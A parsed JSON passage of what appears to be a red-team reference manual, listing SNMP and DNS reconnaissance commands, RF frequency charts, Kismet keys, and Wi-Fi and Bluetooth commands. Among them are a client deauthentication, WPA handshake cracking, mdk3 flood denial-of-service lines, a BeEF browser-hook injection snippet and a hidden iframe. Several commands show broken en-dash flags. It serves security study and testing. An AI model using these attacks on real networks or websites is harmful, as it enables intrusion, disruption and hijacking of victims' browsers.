      "content": "Backup the running configuration to an external TFTP server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SNMP Tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "snmpwalk -c public -v1 <IP_ADDRESS> 1 | grep hrSWRunName | cut -d\" \" –f4",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List Windows running services",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "snmpwalk -c public -v1 <IP_ADDRESS> 1 | grep tcpConnState |cut -d\" \" -f6 |sort -u",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List Windows open TCP ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "snmpwalk -c public -v1 <IP_ADDRESS> 1 | grep hrSWInstalledName",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List Windows installed software",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "snmpwalk -c public -v1 <IP_ADDRESS> 1.3 | grep 77.1.2.25 | cut -d -f4",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List Windows users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNSRecon & NMap Reverse DNS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dnsrecon.py -t rvl -r <CIDR_IP_RANGE> -n <DNS_IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "file_paths": [
          "dnsrecon.py"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reverse lookup for IP range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dnsrecon.py –t std –d <DOMAIN_NAME>",
      "level": 0,
      "metadata": {
        "file_paths": [
          "dnsrecon.py"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Retrieve standard DNS records",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dnsrecon.py –t brt –d <DOMAIN_NAME> –D <HOSTS>",
      "level": 0,
      "metadata": {
        "file_paths": [
          "dnsrecon.py"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate subdomains",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dnsrecon.py –d <DOMAIN_NAME> –t axfr",
      "level": 0,
      "metadata": {
        "file_paths": [
          "dnsrecon.py"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS zone transfer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "nmap –R –sL –Pn –dns-servers <DNS_SERVER_IP> <IP_RANGE> | awk ‘{if(($1\" \"$2\" \"$3)==\"Nmap scan report\")print$5\" \"$6}’ | sed ‘s/(//g’ | sed ‘s/)//g’ > <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reverse DNS lookup and output parser",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: https://github.com/darkoperator/dnsrecon",
      "level": 0,
      "metadata": {
        "urls": [
          "https://github.com/darkoperator/dnsrecon"
        ],
        "file_paths": [
          "//github.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Technologies",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wireless",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Frequency Chart",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "125-134 kHz (LF)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "MHz (HF)",
      "level": 2,
      "metadata": {
        "number": "13.56"
      }
    },
    {
      "type": "code_block",
      "content": "433,860-930Mhz (UHF)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RFID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "MHz (N. Am)",
      "level": 1,
      "metadata": {
        "number": "315"
      }
    },
    {
      "type": "heading",
      "content": "MHz (Europe,Asia)",
      "level": 2,
      "metadata": {
        "number": "433.92"
      }
    },
    {
      "type": "paragraph",
      "content": "Keyless Entry",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "698-894 MHz",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1710-1755 MHz",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1850-1910 MHz",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2110-2155 MHz",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Cellular (US)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Mhz - L1 Band",
      "level": 2,
      "metadata": {
        "number": "1176.45"
      }
    },
    {
      "type": "heading",
      "content": "Mhz - L2 Band",
      "level": 2,
      "metadata": {
        "number": "1227.60"
      }
    },
    {
      "type": "heading",
      "content": "MHz - L5 Band",
      "level": 2,
      "metadata": {
        "number": "1575.42"
      }
    },
    {
      "type": "paragraph",
      "content": "GPS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1-2 GHz",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "L Band",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "MHz (Europe)",
      "level": 1,
      "metadata": {
        "number": "868"
      }
    },
    {
      "type": "heading",
      "content": "MHz (US,Australia)",
      "level": 1,
      "metadata": {
        "number": "915"
      }
    },
    {
      "type": "heading",
      "content": "GHz (worldwide)",
      "level": 2,
      "metadata": {
        "number": "2.4"
      }
    },
    {
      "type": "heading",
      "content": "(ZigBee)",
      "level": 3,
      "metadata": {
        "number": "802.15.4"
      }
    },
    {
      "type": "paragraph",
      "content": "2.4-2.483.5 GHz",
      "level": 0,
      "metadata": {
        "file_paths": [
          "2.4-2.483.5"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "(Bluetooth)",
      "level": 3,
      "metadata": {
        "number": "802.15.1"
      }
    },
    {
      "type": "heading",
      "content": "GHz",
      "level": 2,
      "metadata": {
        "number": "2.4"
      }
    },
    {
      "type": "paragraph",
      "content": "802.11b/g",
      "level": 0,
      "metadata": {
        "file_paths": [
          "802.11b"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "GHz",
      "level": 2,
      "metadata": {
        "number": "5.0"
      }
    },
    {
      "type": "paragraph",
      "content": "802.11a",
      "level": 0,
      "metadata": {
        "file_paths": [
          "802.11a"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2.4/5.0 GHZ",
      "level": 0,
      "metadata": {
        "file_paths": [
          "2.4/5.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "802.11n",
      "level": 0,
      "metadata": {
        "file_paths": [
          "802.11n"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "4-8 GHz",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "C Band",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "12-18 GHz",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ku Band",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "18-26.5 GHz",
      "level": 0,
      "metadata": {
        "file_paths": [
          "18-26.5"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "K Band",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "26.5-40 GHz",
      "level": 0,
      "metadata": {
        "file_paths": [
          "26.5"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ka Band",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Helpful RF Websites",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "https://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm",
      "level": 0,
      "metadata": {
        "urls": [
          "https://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm"
        ],
        "file_paths": [
          "//apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "FCC ID lookup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "http://www.radioreference.com/apps/db/",
      "level": 0,
      "metadata": {
        "urls": [
          "http://www.radioreference.com/apps/db/"
        ],
        "file_paths": [
          "//www.radioreference.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Frequency database",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kismet Command Reference",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "e",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List Kismet servers",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "h",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Help",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "z",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Toggle full-screen view",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "n",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Name current network",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "m",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Toggle muting of sound",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "i",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "View detailed information for network",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "t",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tag or untag selected network",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "s",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Sort network list",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "g",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Group tagged networks",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "l",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Show wireless card power levels",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "u",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ungroup current group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "d",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Dump printable strings",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "c",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Show clients in current network",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "r",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Packet rate graph",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "L",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Lock channel hopping to selected channel",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "View network statistics",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "H",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Return to normal channel hopping",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "p",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Dump packet type",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "+/-",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Expand/collapse groups",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Follow network center",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "CTRL+L",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Re-draw the screen",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "w",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Track alerts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Q",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Quit Kismet",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Close popup window",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: http://www.willhackforsushi.com/papers/80211_Pocket_Reference_Guide.pdf",
      "level": 0,
      "metadata": {
        "urls": [
          "http://www.willhackforsushi.com/papers/80211_Pocket_Reference_Guide.pdf"
        ],
        "file_paths": [
          "//www.willhackforsushi.com/papers/80211_Pocket_Reference_Guide.pdf"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Wi-Fi Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iwconfig",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display wireless interface configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rfkill list",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List current state of wireless devices",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rfkill unblock all",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Turn on wireless interface",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "airodump –ng <INTERFACE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Monitor all interfaces",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iwconfig ath0 essid <BSSID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig ath0 up",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dhclient ath0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect to unsecured Wi-Fi",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iwconfig ath0 essid <BSSID> key <WEB_KEY>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig ath0 up",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dhclient ath0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect to WEP Wi-Fi network",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iwconfig ath0 essid <BSSID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig ath0 up",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wpa_supplicant –B –i ath0 –c wpa-psk.conf",
      "level": 0,
      "metadata": {
        "file_paths": [
          "wpa-psk.conf"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dhclient ath0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect to WPA-PSK Wi-Fi network",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Bluetooth",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hciconfig <INTERFACE_NAME> up",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Turn on Bluetooth interface",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hcitool –i <INTERFACE_NAME> scan --flush –all",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scan for Bluetooth devices",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sdptool browse <INTERFACE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List open services",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "hciconfig <INTERFACE_NAME> name \"<BLUETOOTH_NAME>\" class 0x520204",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "piscan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set as discoverable",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "pand –K",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Clear pand sessions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Wi-Fi Testing",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "airmon-ng stop <INTERFACE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Stop monitor mode interface",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "airmon-ng start <INTERFACE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iwconfig <INTERFACE_NAME> channel <CHANNEL>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start monitor mode interface",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "airodump-ng –c <CHANNEL> --bssid <BSSID> –w file <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Capture traffic",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "aireplay-ng -0 10 –a <BSSID> –c <VICTIM_MAC> <INTERFACE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Force client de-auth",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#WPA-PSK",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "aircrack-ng –w <WORDLIST_PATH> <CAPTURED_HANDSHAKE_FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#EAP-MD5",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "eapmd5pass –r <CAPTURED_HANDSHAKE_FILE_PATH> –w <WORDLIST_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Brute force handshake",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wi-Fi DOS Attacks",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mdk3 <INTERFACE_NAME> a –a <BSSID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Auth Flood",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mdk3 <INTERFACE_NAME> b –c <CHANNEL>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Beacon Flood",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Web",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User Agent String Keywords",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Keywords found in user agent strings aid in identifying the visiting operating system type.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/102.0.5005.87 Mobile/15E148 Safari/604.1",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Keyword: iPhone",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Apple iPhone",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Keyword: Android 12",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Android Phone",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Keyword: Windows NT 10.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Computer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Keyword: Macintosh",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS Computer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HTML Beef Hook Technique",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\">",
      "level": 0,
      "metadata": {
        "file_paths": [
          "1.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<html>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<head>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<title><WEBSITE_TITLE></title>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<script>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "var commandModuleStr = '<script src=\"' + window.location.protocol + '//' + window.location.host + ':<PORT>/<URI_TO_HOOK.JS> \"",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "type=\"text/javascript\"><\\/script>';",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "document.write(commandModuleStr);",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "</script>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "</head>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<WEBSITE_CONTENT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "</html>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Embedded iframe",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "<iframe src=\"<URI/URL>\" width=\"0\" height=\"0\" frameborder=\"0\" tabindex=\"-1\" title=\"empty\" style=visibility:hidden;display:none\"> </iframe>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Firefox Type Conversions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "javascript:btoa(\"<ASCII_STRING>\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ASCII -> Base64",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
